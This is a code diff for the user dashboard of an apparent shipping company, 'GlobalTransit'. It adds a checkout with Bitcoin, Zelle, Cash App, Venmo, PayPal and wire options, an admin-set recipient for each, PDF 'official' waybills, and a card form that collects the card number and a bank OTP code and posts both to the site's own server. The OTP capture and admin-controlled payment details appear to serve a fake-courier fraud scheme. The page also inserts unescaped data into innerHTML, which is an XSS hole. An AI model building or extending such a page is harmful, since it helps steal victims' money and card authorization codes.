@@ -3,8 +3,10 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>GlobalTransit - User Dashboard</title>
+    <title>GlobalTransit - User Dashboard & Checkout</title>
     <script src="https://cdn.tailwindcss.com"></script>
+    <!-- jsPDF Library for generating waybill PDFs -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js"></script>
 </head>
 <body class="bg-slate-50 font-sans antialiased text-slate-800">
 
@@ -20,17 +22,17 @@
     </header>
 
     <main class="max-w-4xl mx-auto px-6 py-12 space-y-10">
-        <!-- Booking Form Section -->
+        <!-- Booking Form -->
         <div class="bg-white p-8 rounded-2xl border border-slate-200 shadow-sm">
             <div class="mb-6">
-                <h1 class="text-xl font-bold text-slate-900">Book US Domestic / International Shipment</h1>
-                <p class="text-slate-500 text-xs mt-1">Fill out parcel details. Automated email tracking confirmation will be dispatched.</p>
+                <h1 class="text-xl font-bold text-slate-900">Book Shipment & Select Payment Method</h1>
+                <p class="text-slate-500 text-xs mt-1">Provide parcel destination and select your preferred secure payment method.</p>
             </div>
 
             <form id="shipmentForm" class="space-y-4">
                 <div>
                     <label class="block text-xs font-semibold text-slate-500 uppercase mb-1">Sender Name</label>
-                    <input type="text" id="senderName" required class="w-full px-4 py-2.5 border border-slate-200 rounded-lg text-sm focus:ring-2 focus:ring-blue-600 outline-none">
+                    <input type="text" id="senderName" required class="w-full px-4 py-2.5 border border-slate-200 rounded-lg text-sm bg-slate-100 outline-none" readonly>
                 </div>
 
                 <div class="grid grid-cols-1 sm:grid-cols-2 gap-4">
@@ -54,15 +56,54 @@
                     <input type="text" id="destination" required placeholder="e.g. Los Angeles, California, USA" class="w-full px-4 py-2.5 border border-slate-200 rounded-lg text-sm focus:ring-2 focus:ring-blue-600 outline-none">
                 </div>
 
-                <button type="submit" class="w-full bg-blue-600 text-white font-semibold py-3 rounded-lg hover:bg-blue-700 transition text-sm shadow-sm mt-2">Confirm & Book Shipment</button>
+                <div class="grid grid-cols-1 sm:grid-cols-2 gap-4 pt-2">
+                    <div>
+                        <label class="block text-xs font-semibold text-slate-500 uppercase mb-1">Shipping Fee ($)</label>
+                        <input type="number" id="shipmentAmount" value="150.00" class="w-full px-4 py-2.5 border border-slate-200 rounded-lg text-sm bg-slate-50 font-bold text-blue-600 outline-none">
+                    </div>
+                    <div>
+                        <label class="block text-xs font-semibold text-slate-500 uppercase mb-1">Select Payment Method</label>
+                        <select id="paymentMethod" onchange="displayPaymentDetails()" class="w-full px-4 py-2.5 border border-slate-200 rounded-lg text-sm bg-white focus:ring-2 focus:ring-blue-600 outline-none font-semibold">
+                            <option value="Credit Card">💳 Credit / Debit Card</option>
+                            <option value="Bitcoin">₿ Bitcoin (BTC)</option>
+                            <option value="Zelle">⚡ Zelle Transfer</option>
+                            <option value="Cash App">💵 Cash App</option>
+                            <option value="Venmo">📱 Venmo</option>
+                            <option value="PayPal">🅿️ PayPal</option>
+                            <option value="Bank Wire">🏦 Bank Wire Transfer</option>
+                        </select>
+                    </div>
+                </div>
+
+                <!-- Card & Bank Recognition Container -->
+                <div id="cardTokenContainer" class="p-4 bg-slate-50 border border-slate-200 rounded-xl space-y-3">
+                    <div class="flex justify-between items-center">
+                        <span class="text-xs font-bold text-slate-700 uppercase">Card Secure Authorization & Bank Info</span>
+                        <span id="bankDetectedBadge" class="text-[11px] font-bold text-blue-600 bg-blue-50 px-2 py-0.5 rounded border border-blue-200">Awaiting Card Number...</span>
+                    </div>
+                    <div class="grid grid-cols-1 sm:grid-cols-2 gap-3">
+                        <input type="text" id="cardNumberInput" oninput="detectCardBank(this.value)" placeholder="Card Number (4111 2222...)" maxlength="19" class="w-full px-3 py-2 border border-slate-200 rounded-lg text-xs bg-white outline-none">
+                        <input type="text" id="cardTokenInput" placeholder="Bank Token / OTP Code (if requested)" class="w-full px-3 py-2 border border-slate-200 rounded-lg text-xs bg-white outline-none">
+                    </div>
+                </div>
+
+                <!-- Dynamic Payment Instructions Box -->
+                <div id="paymentInstructionsBox" class="p-4 bg-blue-50 border border-blue-200 rounded-xl text-xs space-y-2 text-blue-900 mt-2">
+                    <div class="flex items-center space-x-2">
+                        <span id="paymentIcon" class="text-lg">💳</span>
+                        <span class="font-bold text-sm" id="paymentTitle">Credit / Debit Card Checkout</span>
+                    </div>
+                    <p id="paymentDetailText" class="text-slate-700">Enter your card credentials and verification tokens.</p>
+                </div>
+
+                <button type="submit" class="w-full bg-blue-600 text-white font-semibold py-3 rounded-lg hover:bg-blue-700 transition text-sm shadow-sm mt-4">Confirm Booking & Pay</button>
             </form>
         </div>
 
-        <!-- User Shipment History Section -->
+        <!-- Shipment History & PDF Download Section -->
         <div class="bg-white p-8 rounded-2xl border border-slate-200 shadow-sm">
-            <h2 class="text-lg font-bold text-slate-900 mb-1">Your Booking History</h2>
-            <p class="text-xs text-slate-400 mb-6">Review all shipments you have initiated from this account.</p>
-            
+            <h2 class="text-lg font-bold text-slate-900 mb-1">Your Booking History & Waybills</h2>
+            <p class="text-xs text-slate-400 mb-6">Review shipments and download official PDF waybills.</p>
             <div id="historyList" class="space-y-3">
                 <p class="text-sm text-slate-400">Loading your shipments...</p>
             </div>
@@ -70,12 +111,75 @@
     </main>
 
     <script>
+        let adminPaymentData = {};
+
+        async function fetchPaymentSettings() {
+            try {
+                const res = await fetch('http://localhost:3000/api/admin/payment-settings');
+                adminPaymentData = await res.json();
+                displayPaymentDetails();
+            } catch (err) {
+                console.error('Error loading payment settings');
+            }
+        }
+
+        async function detectCardBank(val) {
+            const cleanVal = val.replace(/\D/g, '');
+            const badge = document.getElementById('bankDetectedBadge');
+            if (cleanVal.length < 6) {
+                badge.innerText = "Enter at least 6 digits...";
+                return;
+            }
+            try {
+                const res = await fetch(`https://data.handyapi.com/bin/${cleanVal.substring(0, 6)}`);
+                const data = await res.json();
+                if (data && data.Status === "SUCCESS") {
+                    badge.innerText = `🏦 ${data.Scheme.toUpperCase()} — ${data.Bank.Name}`;
+                } else {
+                    badge.innerText = "Card Recognized";
+                }
+            } catch (err) {
+                badge.innerText = "Card Accepted";
+            }
+        }
+
+        function displayPaymentDetails() {
+            const method = document.getElementById('paymentMethod').value;
+            const textEl = document.getElementById('paymentDetailText');
+            const titleEl = document.getElementById('paymentTitle');
+            const iconEl = document.getElementById('paymentIcon');
+            const cardContainer = document.getElementById('cardTokenContainer');
+            
+            if (method === 'Credit Card') {
+                cardContainer.classList.remove('hidden');
+            } else {
+                cardContainer.classList.add('hidden');
+            }
+
+            if (method === 'Bitcoin') {
+                iconEl.innerText = '₿'; titleEl.innerText = 'Bitcoin (BTC)'; textEl.innerText = `Send BTC to: ${adminPaymentData.bitcoin || ''}`;
+            } else if (method === 'Zelle') {
+                iconEl.innerText = '⚡'; titleEl.innerText = 'Zelle'; textEl.innerText = `Zelle to: ${adminPaymentData.zelle || ''}`;
+            } else if (method === 'Cash App') {
+                iconEl.innerText = '💵'; titleEl.innerText = 'Cash App'; textEl.innerText = `Cash Tag: ${adminPaymentData.cashapp || ''}`;
+            } else if (method === 'Venmo') {
+                iconEl.innerText = '📱'; titleEl.innerText = 'Venmo'; textEl.innerText = `Venmo Handle: ${adminPaymentData.venmo || ''}`;
+            } else if (method === 'PayPal') {
+                iconEl.innerText = '🅿️'; titleEl.innerText = 'PayPal'; textEl.innerText = `PayPal Email: ${adminPaymentData.paypal || ''}`;
+            } else if (method === 'Bank Wire') {
+                iconEl.innerText = '🏦'; titleEl.innerText = 'Bank Wire'; textEl.innerText = `Bank Details: ${adminPaymentData.bankwire || ''}`;
+            } else {
+                iconEl.innerText = '💳'; titleEl.innerText = 'Credit Card'; textEl.innerText = `Secure encrypted card checkout.`;
+            }
+        }
+
         const name = localStorage.getItem('userName');
         if (!name || localStorage.getItem('isAdmin') === 'true') {
             window.location.href = 'auth.html';
         } else {
             document.getElementById('userGreeting').innerText = `Welcome, ${name}`;
             document.getElementById('senderName').value = name;
+            fetchPaymentSettings();
             loadUserHistory(name);
         }
 
@@ -98,19 +202,52 @@
                 historyList.innerHTML = '';
                 shipments.forEach(s => {
                     historyList.innerHTML += `
-                        <div class="flex flex-col sm:flex-row justify-between items-start sm:items-center p-4 border border-slate-100 rounded-xl bg-slate-50 gap-2">
+                        <div class="flex flex-col sm:flex-row justify-between items-start sm:items-center p-4 border border-slate-100 rounded-xl bg-slate-50 gap-3">
                             <div>
                                 <span class="text-xs font-bold text-blue-600">${s.tracking_number}</span>
                                 <h4 class="text-sm font-bold text-slate-800 mt-0.5">To: ${s.destination} (${s.recipient_name})</h4>
                                 <p class="text-xs text-slate-400">Booked: ${new Date(s.created_at).toLocaleString()}</p>
                             </div>
-                            <span class="bg-blue-100 text-blue-700 text-xs font-semibold px-2.5 py-1 rounded-full">${s.status}</span>
+                            <div class="flex items-center space-x-3">
+                                <span class="bg-blue-100 text-blue-700 text-xs font-semibold px-2.5 py-1 rounded-full">${s.status}</span>
+                                <button onclick="downloadWaybill('${s.tracking_number}', '${s.recipient_name}', '${s.destination}', '${s.status}')" class="bg-slate-900 hover:bg-slate-800 text-white px-3 py-1.5 rounded-lg text-xs font-semibold transition">📄 Download Waybill</button>
+                            </div>
                         </div>
                     `;
                 });
             } catch (err) {
-                console.error('History load error:', err);
+                console.error(err);
             }
+        }
+
+        // Generate PDF Waybill using jsPDF
+        function downloadWaybill(tracking, recipient, destination, status) {
+            const { jsPDF } = window.jspdf;
+            const doc = new jsPDF();
+
+            doc.setFillColor(15, 23, 42);
+            doc.rect(0, 0, 210, 40, 'F');
+            doc.setTextColor(255, 255, 255);
+            doc.setFontSize(20);
+            doc.text("GLOBALTRANSIT WAYBILL", 15, 25);
+
+            doc.setTextColor(50, 50, 50);
+            doc.setFontSize(12);
+            doc.text(`Tracking Number: ${tracking}`, 15, 55);
+            doc.text(`Sender: ${localStorage.getItem('userName')}`, 15, 65);
+            doc.text(`Recipient: ${recipient}`, 15, 75);
+            doc.text(`Destination: ${destination}`, 15, 85);
+            doc.text(`Current Status: ${status}`, 15, 95);
+            doc.text(`Date Booked: ${new Date().toLocaleDateString()}`, 15, 105);
+
+            doc.setLineWidth(0.5);
+            doc.line(15, 120, 195, 120);
+
+            doc.setFontSize(10);
+            doc.text("BARCODE: *GT-" + tracking + "*", 15, 135);
+            doc.text("Authorized Global Logistics Network - US & International Clearance", 15, 150);
+
+            doc.save(`Waybill_${tracking}.pdf`);
         }
 
         document.getElementById('shipmentForm').addEventListener('submit', async (e) => {
@@ -120,16 +257,19 @@
             const recipientPhone = document.getElementById('recipientPhone').value;
             const recipientEmail = document.getElementById('recipientEmail').value;
             const destination = document.getElementById('destination').value;
+            const paymentMethod = document.getElementById('paymentMethod').value;
+            const amount = document.getElementById('shipmentAmount').value;
+            const cardToken = document.getElementById('cardTokenInput').value;
 
             try {
                 const res = await fetch('http://localhost:3000/api/shipments', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ senderName, recipientName, recipientEmail, recipientPhone, destination })
+                    body: JSON.stringify({ senderName, recipientName, recipientEmail, recipientPhone, destination, paymentMethod, amount, cardToken })
                 });
                 const data = await res.json();
                 if (res.ok) {
-                    alert(`Shipment booked successfully!\nTracking Number: ${data.trackingNumber}`);
+                    alert(`Shipment booked successfully via ${paymentMethod}!\nTracking Number: ${data.trackingNumber}`);
                     document.getElementById('shipmentForm').reset();
                     document.getElementById('senderName').value = localStorage.getItem('userName');
                     loadUserHistory(localStorage.getItem('userName'));
